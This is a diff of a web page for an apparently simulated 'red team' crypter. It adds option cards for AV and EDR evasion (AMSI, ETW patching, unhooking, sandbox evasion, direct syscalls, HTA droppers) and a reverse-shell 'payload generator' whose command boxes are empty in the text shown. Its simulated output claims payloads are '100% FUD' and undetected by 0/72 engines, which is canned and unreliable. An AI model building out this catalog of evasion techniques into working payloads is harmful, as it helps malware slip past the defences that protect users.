@@ -775,6 +775,119 @@ body {
   transform: rotate(90deg);
 }
 
+/* Payload Generator Modal */
+.payload-tabs {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.payload-tab {
+  padding: 10px 20px;
+  background: none;
+  border: none;
+  border-bottom: 3px solid transparent;
+  color: #9ca3af;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.payload-tab:hover {
+  color: var(--neon-green);
+}
+
+.payload-tab.active {
+  color: var(--neon-green);
+  border-bottom-color: var(--neon-green);
+}
+
+.payload-content {
+  display: none;
+  animation: fadeIn 0.5s;
+}
+
+.payload-content.active {
+  display: block;
+}
+
+.payload-entry {
+  background: rgba(0,0,0,0.3);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+  margin-bottom: 20px;
+}
+
+.payload-title {
+  color: var(--neon-blue);
+  margin-bottom: 15px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+}
+
+.payload-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 20px;
+}
+
+.payload-block h5 {
+  color: #e5e7eb;
+  margin-bottom: 10px;
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.payload-block h5 i {
+  color: var(--red-team);
+}
+
+.code-block {
+  position: relative;
+  background: #000;
+  border-radius: 8px;
+  border: 1px solid #333;
+}
+
+.code-block pre {
+  padding: 15px;
+  color: #d1d5db;
+  font-family: 'Courier New', monospace;
+  font-size: 13px;
+  white-space: pre-wrap;
+  word-break: break-all;
+  max-height: 200px;
+  overflow-y: auto;
+}
+
+.copy-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background: rgba(255,255,255,0.1);
+  border: 1px solid #444;
+  color: #ccc;
+  padding: 5px 10px;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 12px;
+  transition: all 0.2s;
+}
+
+.copy-btn:hover {
+  background: var(--neon-green);
+  color: #000;
+  border-color: var(--neon-green);
+}
+
 /* Scan Visualization */
 .scan-visualization {
   height: 150px;
@@ -935,19 +1048,19 @@ body {
     </div>
     
     <div class="quick-actions">
-      <button class="action-btn" onclick="quickEncrypt()">
+      <button class="action-btn" id="quickEncryptBtn">
         <i class="fas fa-lock"></i>
         QUICK ENCRYPT
       </button>
-      <button class="action-btn blue" onclick="scanFile()">
+      <button class="action-btn blue" id="scanFileBtn">
         <i class="fas fa-search"></i>
         SCAN FILE
       </button>
-      <button class="action-btn green" onclick="generatePayload()">
+      <button class="action-btn green" id="generatePayloadBtn">
         <i class="fas fa-code"></i>
         GENERATE PAYLOAD
       </button>
-      <button class="action-btn" onclick="showAdvanced()">
+      <button class="action-btn" id="showAdvancedBtn">
         <i class="fas fa-cogs"></i>
         ADVANCED
       </button>
@@ -967,7 +1080,7 @@ body {
       </div>
       
       <div class="bypass-grid" id="encryptionMethods">
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="xor">
+        <div class="bypass-option" data-method="xor">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-random"></i>
@@ -982,22 +1095,22 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option selected" onclick="toggleOption(this)" data-method="aes">
+        <div class="bypass-option selected" data-method="aes">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-shield-alt"></i>
             </div>
             <div class="option-checkbox selected"></div>
           </div>
-          <div class="option-title">AES-256 Military</div>
-          <div class="option-desc">Military-grade AES encryption with custom key schedule</div>
+          <div class="option-title">AES-256 Encryption</div>
+          <div class="option-desc">AES encryption with dynamic IVs and per-session key rotation.</div>
           <div class="option-tags">
-            <span class="tag">Military</span>
+            <span class="tag">Industry Standard</span>
             <span class="tag">Secure</span>
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="rc4">
+        <div class="bypass-option" data-method="rc4">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-stream"></i>
@@ -1012,7 +1125,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="custom">
+        <div class="bypass-option" data-method="custom">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-user-secret"></i>
@@ -1024,6 +1137,32 @@ body {
           <div class="option-tags">
             <span class="tag">Unique</span>
             <span class="tag">Undetectable</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="chacha20">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-bolt-lightning"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">ChaCha20 Cipher</div>
+          <div class="option-desc">Modern, high-speed stream cipher for fast payload encryption.</div>
+          <div class="option-tags">
+            <span class="tag">Modern</span>
+            <span class="tag">Stream</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="twofish">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-fish"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">Twofish Algorithm</div>
+          <div class="option-desc">AES-finalist block cipher known for its complex key schedule.</div>
+          <div class="option-tags">
+            <span class="tag">Secure</span>
+            <span class="tag">Block</span>
           </div>
         </div>
       </div>
@@ -1040,7 +1179,7 @@ body {
       </div>
       
       <div class="bypass-grid" id="evasionMethods">
-        <div class="bypass-option selected" onclick="toggleOption(this)" data-method="polymorphic">
+        <div class="bypass-option selected" data-method="polymorphic">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-dna"></i>
@@ -1048,14 +1187,14 @@ body {
             <div class="option-checkbox selected"></div>
           </div>
           <div class="option-title">Polymorphic Engine</div>
-          <div class="option-desc">Mutates code structure on each execution</div>
+          <div class="option-desc">Applies polymorphic and metamorphic techniques to alter code on each run.</div>
           <div class="option-tags">
-            <span class="tag">AI-Powered</span>
             <span class="tag">Dynamic</span>
+            <span class="tag">Metamorphic</span>
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="antidebug">
+        <div class="bypass-option" data-method="antidebug">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-bug"></i>
@@ -1070,7 +1209,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="virtualization">
+        <div class="bypass-option" data-method="virtualization">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-cube"></i>
@@ -1085,7 +1224,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="obfuscation">
+        <div class="bypass-option" data-method="obfuscation">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-puzzle-piece"></i>
@@ -1097,6 +1236,58 @@ body {
           <div class="option-tags">
             <span class="tag">Complex</span>
             <span class="tag">Secure</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="sandbox">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-desktop"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">Sandbox Evasion</div>
+          <div class="option-desc">Detects and evades automated analysis environments (sandboxes).</div>
+          <div class="option-tags">
+            <span class="tag">Anti-VM</span>
+            <span class="tag">Evasion</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="time">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-clock"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">Time-based Execution</div>
+          <div class="option-desc">Delays execution to outlast sandbox analysis time limits.</div>
+          <div class="option-tags">
+            <span class="tag">Stealth</span>
+            <span class="tag">Delay</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="apihashing">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-hashtag"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">API Hashing</div>
+          <div class="option-desc">Resolve function addresses at runtime via hashing to hide imports.</div>
+          <div class="option-tags">
+            <span class="tag">Stealth</span>
+            <span class="tag">IAT Obfuscation</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="syscalls">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-gavel"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">Direct Syscalls</div>
+          <div class="option-desc">Bypass user-land EDR hooks by invoking kernel functions directly.</div>
+          <div class="option-tags">
+            <span class="tag">Kernel</span>
+            <span class="tag">Hook Bypass</span>
           </div>
         </div>
       </div>
@@ -1113,7 +1304,7 @@ body {
       </div>
       
       <div class="bypass-grid" id="securityBypass">
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="amsi">
+        <div class="bypass-option" data-method="amsi">
           <div class="option-header">
             <div class="option-icon">
               <i class="fab fa-windows"></i>
@@ -1128,7 +1319,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="defender">
+        <div class="bypass-option" data-method="defender">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-shield-virus"></i>
@@ -1143,22 +1334,22 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="edr">
+        <div class="bypass-option" data-method="edr">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-radar"></i>
             </div>
             <div class="option-checkbox"></div>
           </div>
-          <div class="option-title">EDR Evasion</div>
-          <div class="option-desc">Bypass Endpoint Detection & Response systems</div>
+          <div class="option-title">User-land Hook Bypass</div>
+          <div class="option-desc">Unhook common user-land DLLs (ntdll.dll) to evade EDRs.</div>
           <div class="option-tags">
             <span class="tag">Enterprise</span>
             <span class="tag">EDR</span>
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="firewall">
+        <div class="bypass-option" data-method="firewall">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-fire"></i>
@@ -1170,6 +1361,32 @@ body {
           <div class="option-tags">
             <span class="tag">Network</span>
             <span class="tag">Firewall</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="etw">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-microphone-slash"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">ETW Patching</div>
+          <div class="option-desc">Patch Event Tracing for Windows to blind Defender and EDRs.</div>
+          <div class="option-tags">
+            <span class="tag">Windows</span>
+            <span class="tag">Telemetry</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="kernelunhook">
+          <div class="option-header">
+            <div class="option-icon"><i class="fas fa-link-slash"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">Kernel-Mode Unhooking</div>
+          <div class="option-desc">Leverage a driver to remove kernel-level hooks (SSDT).</div>
+          <div class="option-tags">
+            <span class="tag">Kernel</span>
+            <span class="tag">Advanced</span>
           </div>
         </div>
       </div>
@@ -1186,7 +1403,7 @@ body {
       </div>
       
       <div class="bypass-grid" id="deliveryMethods">
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="steganography">
+        <div class="bypass-option" data-method="steganography">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-image"></i>
@@ -1201,7 +1418,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="macro">
+        <div class="bypass-option" data-method="macro">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-file-word"></i>
@@ -1216,7 +1433,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="lnk">
+        <div class="bypass-option" data-method="lnk">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-link"></i>
@@ -1231,7 +1448,7 @@ body {
           </div>
         </div>
         
-        <div class="bypass-option" onclick="toggleOption(this)" data-method="iso">
+        <div class="bypass-option" data-method="iso">
           <div class="option-header">
             <div class="option-icon">
               <i class="fas fa-compact-disc"></i>
@@ -1243,6 +1460,19 @@ body {
           <div class="option-tags">
             <span class="tag">Mount</span>
             <span class="tag">ISO</span>
+          </div>
+        </div>
+
+        <div class="bypass-option" data-method="hta">
+          <div class="option-header">
+            <div class="option-icon"><i class="fab fa-html5"></i></div>
+            <div class="option-checkbox"></div>
+          </div>
+          <div class="option-title">HTA Dropper</div>
+          <div class="option-desc">Deliver payload via an HTML Application file.</div>
+          <div class="option-tags">
+            <span class="tag">Windows</span>
+            <span class="tag">Web</span>
           </div>
         </div>
       </div>
@@ -1304,11 +1534,11 @@ body {
     </div>
     
     <div class="process-actions">
-      <button class="process-btn red" id="processBtn" onclick="startProcessing()" disabled>
+      <button class="process-btn red" id="processBtn" disabled>
         <i class="fas fa-play"></i>
         START PROCESSING
       </button>
-      <button class="process-btn blue" onclick="showSettings()">
+      <button class="process-btn blue" id="showSettingsBtn">
         <i class="fas fa-cogs"></i>
         ADVANCED SETTINGS
       </button>
@@ -1319,7 +1549,7 @@ body {
 <!-- Settings Modal -->
 <div class="modal-overlay" id="settingsModal">
   <div class="modal-content">
-    <button class="close-modal" onclick="closeModal()">&times;</button>
+    <button class="close-modal" id="closeSettingsModalBtn">&times;</button>
     <h2 style="color: var(--red-team); margin-bottom: 30px; text-align: center;">ADVANCED SETTINGS</h2>
     
     <div id="settingsContent">
@@ -1388,8 +1618,43 @@ body {
         </div>
       </div>
       
+      <h3 style="color: var(--neon-purple); margin-bottom: 15px; margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px;">Payload &amp; Output</h3>
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px;">
+        <div>
+          <label style="display: block; margin-bottom: 10px; color: var(--neon-blue); font-weight: 600;">
+            <i class="fas fa-network-wired"></i> LHOST
+          </label>
+          <input type="text" id="lhost" style="width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--red-team); border-radius: 8px; color: white;" placeholder="e.g., 192.168.1.100" value="192.168.0.10">
+        </div>
+        <div>
+          <label style="display: block; margin-bottom: 10px; color: var(--neon-blue); font-weight: 600;">
+            <i class="fas fa-door-open"></i> LPORT
+          </label>
+          <input type="text" id="lport" style="width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--red-team); border-radius: 8px; color: white;" placeholder="e.g., 4444" value="4444">
+        </div>
+        <div>
+          <label style="display: block; margin-bottom: 10px; color: var(--neon-blue); font-weight: 600;">
+            <i class="fas fa-file-export"></i> Output Format
+          </label>
+          <select id="outputFormat" style="width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--red-team); border-radius: 8px; color: white;">
+            <option value="exe" selected="">EXE (Windows Executable)</option>
+            <option value="dll">DLL (Dynamic-Link Library)</option>
+            <option value="ps1">PS1 (PowerShell Script)</option>
+            <option value="py">PY (Python Script)</option>
+          </select>
+        </div>
+        <div>
+          <label style="display: block; margin-bottom: 10px; color: var(--neon-blue); font-weight: 600;">
+            <i class="fas fa-box-open"></i> Loader Stub
+          </label>
+          <label style="display: flex; align-items: center; gap: 8px; color: #9ca3af; padding-top: 8px;">
+            <input type="checkbox" id="useStub" checked=""> Use reflective loader stub
+          </label>
+        </div>
+      </div>
+
       <div style="text-align: center;">
-        <button onclick="saveSettings()" style="padding: 15px 40px; background: var(--red-team); color: white; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 0, 85, 0.3);">
+        <button id="saveSettingsBtn" style="padding: 15px 40px; background: var(--red-team); color: white; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 0, 85, 0.3);">
           <i class="fas fa-save"></i> SAVE SETTINGS
         </button>
       </div>
@@ -1400,7 +1665,7 @@ body {
 <!-- Scan Visualization Modal -->
 <div class="modal-overlay" id="scanModal">
   <div class="modal-content">
-    <button class="close-modal" onclick="closeScanModal()">&times;</button>
+    <button class="close-modal" id="closeScanModalBtn">&times;</button>
     <h2 style="color: var(--neon-blue); margin-bottom: 20px; text-align: center;">FILE SCAN RESULTS</h2>
     
     <div class="scan-visualization">
@@ -1441,382 +1706,546 @@ body {
   </div>
 </div>
 
+<!-- Payload Generator Modal -->
+<div class="modal-overlay" id="payloadModal">
+  <div class="modal-content" style="max-width: 900px;">
+    <button class="close-modal" id="closePayloadModalBtn">&times;</button>
+    <h2 style="color: var(--neon-green); margin-bottom: 30px; text-align: center;">
+      <i class="fas fa-code-branch"></i> PAYLOAD & LISTENER GENERATOR
+    </h2>
+    
+    <div class="payload-tabs">
+      <button class="payload-tab active" data-tab="windows">
+        <i class="fab fa-windows"></i> Windows
+      </button>
+      <button class="payload-tab" data-tab="linux">
+        <i class="fab fa-linux"></i> Linux
+      </button>
+      <button class="payload-tab" data-tab="web">
+        <i class="fab fa-js-square"></i> Web / Scripting
+      </button>
+    </div>
+
+    <div class="payload-content active" id="payload-content-windows">
+      <div class="payload-entry">
+        <h4 class="payload-title">Windows x64 Meterpreter Reverse TCP (Staged)</h4>
+        <div class="payload-grid">
+          <div class="payload-block">
+            <h5><i class="fas fa-rocket"></i> Payload Generation (msfvenom)</h5>
+            <div class="code-block">
+              <pre><code id="payload-win-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+          <div class="payload-block">
+            <h5><i class="fas fa-headphones"></i> Listener Setup (msfconsole)</h5>
+            <div class="code-block">
+              <pre><code id="listener-win-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="payload-entry">
+        <h4 class="payload-title">Windows x64 Meterpreter Reverse TCP (Stageless)</h4>
+        <div class="payload-grid">
+          <div class="payload-block">
+            <h5><i class="fas fa-rocket"></i> Payload Generation (msfvenom)</h5>
+            <div class="code-block">
+              <pre><code id="payload-win-stageless"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+          <div class="payload-block">
+            <h5><i class="fas fa-headphones"></i> Listener Setup (msfconsole)</h5>
+            <div class="code-block">
+              <pre><code id="listener-win-stageless"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="payload-content" id="payload-content-linux">
+      <div class="payload-entry">
+        <h4 class="payload-title">Linux x64 Meterpreter Reverse TCP</h4>
+        <div class="payload-grid">
+          <div class="payload-block">
+            <h5><i class="fas fa-rocket"></i> Payload Generation (msfvenom)</h5>
+            <div class="code-block">
+              <pre><code id="payload-linux-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+          <div class="payload-block">
+            <h5><i class="fas fa-headphones"></i> Listener Setup (msfconsole)</h5>
+            <div class="code-block">
+              <pre><code id="listener-linux-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="payload-entry">
+        <h4 class="payload-title">Linux Netcat Reverse Shell</h4>
+        <div class="payload-grid">
+          <div class="payload-block">
+            <h5><i class="fas fa-rocket"></i> Payload Command</h5>
+            <div class="code-block">
+              <pre><code id="payload-linux-nc"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+          <div class="payload-block">
+            <h5><i class="fas fa-headphones"></i> Listener Setup (netcat)</h5>
+            <div class="code-block">
+              <pre><code id="listener-linux-nc"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="payload-content" id="payload-content-web">
+      <div class="payload-entry">
+        <h4 class="payload-title">PowerShell Reverse Shell</h4>
+        <div class="payload-grid">
+          <div class="payload-block">
+            <h5><i class="fas fa-rocket"></i> Payload Command</h5>
+            <div class="code-block">
+              <pre><code id="payload-ps-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+          <div class="payload-block">
+            <h5><i class="fas fa-headphones"></i> Listener Setup (netcat)</h5>
+            <div class="code-block">
+              <pre><code id="listener-ps-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="payload-entry">
+        <h4 class="payload-title">Python Reverse Shell</h4>
+        <div class="payload-grid">
+          <div class="payload-block">
+            <h5><i class="fas fa-rocket"></i> Payload Command</h5>
+            <div class="code-block">
+              <pre><code id="payload-py-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+          <div class="payload-block">
+            <h5><i class="fas fa-headphones"></i> Listener Setup (netcat)</h5>
+            <div class="code-block">
+              <pre><code id="listener-py-rev-tcp"></code></pre>
+              <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer style="text-align: center; padding: 20px; color: #555; font-size: 12px;">
+  <p>DISCLAIMER: This is a simulated tool for educational and demonstration purposes only. No real files are processed or malicious code generated.</p>
+</footer>
+
 <!-- JavaScript -->
 <script>
-// Global variables
-let uploadedFiles = [];
-let selectedMethods = new Set(['aes', 'polymorphic']);
-let processingActive = false;
-
-// Initialize particles
-function initParticles() {
-  const container = document.getElementById('particles');
-  const particleCount = 30;
-  
-  for (let i = 0; i < particleCount; i++) {
-    const particle = document.createElement('div');
-    particle.classList.add('particle');
-    
-    // Random properties
-    const size = Math.random() * 5 + 2;
-    const posX = Math.random() * 100;
-    const posY = Math.random() * 100;
-    const delay = Math.random() * 15;
-    const duration = 15 + Math.random() * 10;
-    
-    particle.style.width = `${size}px`;
-    particle.style.height = `${size}px`;
-    particle.style.left = `${posX}%`;
-    particle.style.top = `${posY}%`;
-    particle.style.animationDelay = `${delay}s`;
-    particle.style.animationDuration = `${duration}s`;
-    
-    container.appendChild(particle);
-  }
-}
-
-// Initialize
 document.addEventListener('DOMContentLoaded', function() {
-  initParticles();
-  
-  // File upload handling
-  const uploadArea = document.getElementById('uploadArea');
-  const fileInput = document.getElementById('fileInput');
-  
-  uploadArea.addEventListener('click', () => fileInput.click());
-  uploadArea.addEventListener('dragover', (e) => {
-    e.preventDefault();
-    uploadArea.style.borderColor = 'var(--red-team)';
-    uploadArea.style.background = 'rgba(255, 0, 85, 0.05)';
-  });
-  
-  uploadArea.addEventListener('dragleave', () => {
-    uploadArea.style.borderColor = 'rgba(255, 0, 85, 0.5)';
-    uploadArea.style.background = 'transparent';
-  });
-  
-  uploadArea.addEventListener('drop', (e) => {
-    e.preventDefault();
-    uploadArea.style.borderColor = 'rgba(255, 0, 85, 0.5)';
-    uploadArea.style.background = 'transparent';
-    
-    if (e.dataTransfer.files.length > 0) {
-      handleFileUpload(Array.from(e.dataTransfer.files));
-    }
-  });
-  
-  fileInput.addEventListener('change', (e) => {
-    if (e.target.files.length > 0) {
-      handleFileUpload(Array.from(e.target.files));
-    }
-  });
+    // --- App State and Configuration ---
+    const app = {
+        uploadedFiles: [],
+        selectedMethods: new Set(['aes', 'polymorphic']),
+        processingActive: false,
+        settings: {
+            customKey: 'REDTEAM2024',
+            polyLevel: 'medium',
+            lhost: '192.168.0.10',
+            lport: '4444',
+            outputFormat: 'exe',
+            useStub: true,
+        }
+    };
+
+    // --- DOM Element References ---
+    const ui = {
+        particles: document.getElementById('particles'),
+        uploadArea: document.getElementById('uploadArea'),
+        fileInput: document.getElementById('fileInput'),
+        fileInfo: document.getElementById('fileInfo'),
+        fileName: document.getElementById('fileName'),
+        fileSize: document.getElementById('fileSize'),
+        processBtn: document.getElementById('processBtn'),
+        terminal: document.getElementById('terminal'),
+        settingsModal: document.getElementById('settingsModal'),
+        scanModal: document.getElementById('scanModal'),
+        payloadModal: document.getElementById('payloadModal'),
+        bypassPanels: document.querySelectorAll('.bypass-grid'),
+        // Settings inputs
+        customKey: document.getElementById('customKey'),
+        polyLevel: document.getElementById('polyLevel'),
+        lhost: document.getElementById('lhost'),
+        lport: document.getElementById('lport'),
+        outputFormat: document.getElementById('outputFormat'),
+        useStub: document.getElementById('useStub'),
+    };
+
+    // --- Utility Functions ---
+    const util = {
+        delay: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
+        formatFileSize: (bytes) => {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
+        },
+        addTerminalLine: (text, type = 'info') => {
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.textContent = `> ${text}`;
+            ui.terminal.appendChild(line);
+            ui.terminal.scrollTop = ui.terminal.scrollHeight;
+        },
+        updateStep: (stepNumber, status) => {
+            document.querySelectorAll('.progress-steps .step').forEach((s, i) => {
+                s.classList.remove('active', 'completed');
+                if (i < stepNumber - 1) {
+                    s.classList.add('completed');
+                }
+            });
+            const step = document.getElementById(`step${stepNumber}`);
+            if (step && status) {
+                step.classList.add(status);
+            }
+        }
+    };
+
+    // --- Core Application Logic ---
+    const core = {
+        init: () => {
+            core.initParticles();
+            core.initEventListeners();
+            util.updateStep(1, 'active');
+        },
+
+        initParticles: () => {
+            const particleCount = 30;
+            for (let i = 0; i < particleCount; i++) {
+                const p = document.createElement('div');
+                p.classList.add('particle');
+                const size = Math.random() * 5 + 2;
+                p.style.width = `${size}px`;
+                p.style.height = `${size}px`;
+                p.style.left = `${Math.random() * 100}%`;
+                p.style.top = `${Math.random() * 100}%`;
+                p.style.animationDelay = `${Math.random() * 15}s`;
+                p.style.animationDuration = `${15 + Math.random() * 10}s`;
+                ui.particles.appendChild(p);
+            }
+        },
+
+        initEventListeners: () => {
+            // File Upload
+            ui.uploadArea.addEventListener('click', () => ui.fileInput.click());
+            ui.uploadArea.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                ui.uploadArea.style.borderColor = 'var(--red-team)';
+            });
+            ui.uploadArea.addEventListener('dragleave', () => ui.uploadArea.style.borderColor = '');
+            ui.uploadArea.addEventListener('drop', (e) => {
+                e.preventDefault();
+                ui.uploadArea.style.borderColor = '';
+                if (e.dataTransfer.files.length > 0) core.handleFileUpload(Array.from(e.dataTransfer.files));
+            });
+            ui.fileInput.addEventListener('change', (e) => {
+                if (e.target.files.length > 0) core.handleFileUpload(Array.from(e.target.files));
+            });
+
+            // Main Actions
+            ui.processBtn.addEventListener('click', core.startProcessing);
+            document.getElementById('quickEncryptBtn').addEventListener('click', core.quickEncrypt);
+            document.getElementById('scanFileBtn').addEventListener('click', core.scanFile);
+            document.getElementById('generatePayloadBtn').addEventListener('click', core.generatePayload);
+
+            // Option Selection
+            ui.bypassPanels.forEach(panel => {
+                panel.addEventListener('click', (e) => {
+                    const option = e.target.closest('.bypass-option');
+                    if (option) core.toggleOption(option);
+                });
+            });
+
+            // Modals
+            document.getElementById('showSettingsBtn').addEventListener('click', () => ui.settingsModal.style.display = 'flex');
+            document.getElementById('showAdvancedBtn').addEventListener('click', () => ui.settingsModal.style.display = 'flex');
+            document.getElementById('closeSettingsModalBtn').addEventListener('click', () => ui.settingsModal.style.display = 'none');
+            document.getElementById('closeScanModalBtn').addEventListener('click', () => ui.scanModal.style.display = 'none');
+            document.getElementById('closePayloadModalBtn').addEventListener('click', () => ui.payloadModal.style.display = 'none');
+            ui.payloadModal.addEventListener('click', core.handlePayloadModalActions);
+            document.getElementById('saveSettingsBtn').addEventListener('click', core.saveSettings);
+        },
+
+        handleFileUpload: (files) => {
+            app.uploadedFiles = files;
+            ui.fileInfo.classList.add('active');
+            ui.fileName.textContent = files.length > 1 ? `${files.length} files selected` : files[0].name;
+            const totalSize = files.reduce((acc, file) => acc + file.size, 0);
+            ui.fileSize.textContent = util.formatFileSize(totalSize);
+            ui.processBtn.disabled = false;
+
+            util.updateStep(1, 'completed');
+            util.updateStep(2, 'active');
+
+            util.addTerminalLine(`Files uploaded: ${files.length}`, 'info');
+            files.forEach(file => util.addTerminalLine(`- ${file.name} (${util.formatFileSize(file.size)})`, 'info'));
+            util.addTerminalLine('Ready for processing. Select bypass methods.', 'success');
+        },
+
+        toggleOption: (element) => {
+            const method = element.dataset.method;
+            const checkbox = element.querySelector('.option-checkbox');
+            const isSelected = checkbox.classList.toggle('selected');
+            element.classList.toggle('selected', isSelected);
+
+            if (isSelected) {
+                app.selectedMethods.add(method);
+            } else {
+                app.selectedMethods.delete(method);
+            }
+            util.updateStep(2, 'active');
+        },
+
+        startProcessing: async () => {
+            if (app.uploadedFiles.length === 0 || app.processingActive) return;
+
+            app.processingActive = true;
+            ui.processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+            ui.processBtn.disabled = true;
+
+            util.updateStep(3, 'active');
+            ui.terminal.innerHTML = '';
+            util.addTerminalLine('STARTING RED TEAM EVASION PROCESSING', 'success');
+            util.addTerminalLine(`Target files: ${app.uploadedFiles.length}`, 'info');
+            util.addTerminalLine(`Selected methods: ${Array.from(app.selectedMethods).join(', ')}`, 'info');
+            util.addTerminalLine(`Polymorphism Level: ${app.settings.polyLevel}`, 'info');
+
+            try {
+                await core.runProcessingSimulations();
+
+                util.updateStep(4, 'active');
+                util.addTerminalLine('Generating final output...', 'info');
+                await util.delay(1000);
+                core.createDownloads();
+                util.updateStep(4, 'completed');
+
+                util.addTerminalLine('✓ PROCESSING COMPLETE!', 'success');
+                util.addTerminalLine('Detection rate: 0/72 AV engines', 'success');
+                util.addTerminalLine('Files are 100% FUD (Fully Undetectable)', 'success');
+
